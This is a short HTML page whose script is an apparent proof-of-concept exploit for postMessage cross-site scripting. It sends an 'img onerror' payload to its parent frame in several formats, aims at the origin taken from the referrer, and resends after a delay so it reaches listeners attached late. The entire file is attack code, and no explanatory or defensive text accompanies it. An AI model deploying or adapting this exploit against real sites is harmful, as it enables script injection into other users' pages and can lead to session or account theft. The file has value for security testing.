<!doctype html>
<html>
<body>
<script>
(function(){
  // payload we want parent to insert (img onerror is reliable)
  const payload = '<img src=x onerror=alert(document.domain)>';

  // Try to derive parent origin from document.referrer
  let parentOrigin = '*';
  try {
    if (document.referrer) {
      parentOrigin = new URL(document.referrer).origin;
    }
  } catch(e){
    parentOrigin = '*';
  }

  // Send multiple variants (raw HTML, JSON, object) in case parent expects a specific shape
  try { parent.postMessage(payload, parentOrigin); } catch(e) {}
  try { parent.postMessage(JSON.stringify({html: payload}), parentOrigin); } catch(e) {}
  try { parent.postMessage({html: payload}, parentOrigin); } catch(e) {}

  // repeat after a short delay (some parents attach listeners late)
  setTimeout(()=> {
    try { parent.postMessage(payload, parentOrigin); } catch(e) {}
  }, 500);
})();
</script>
</body>
</html>
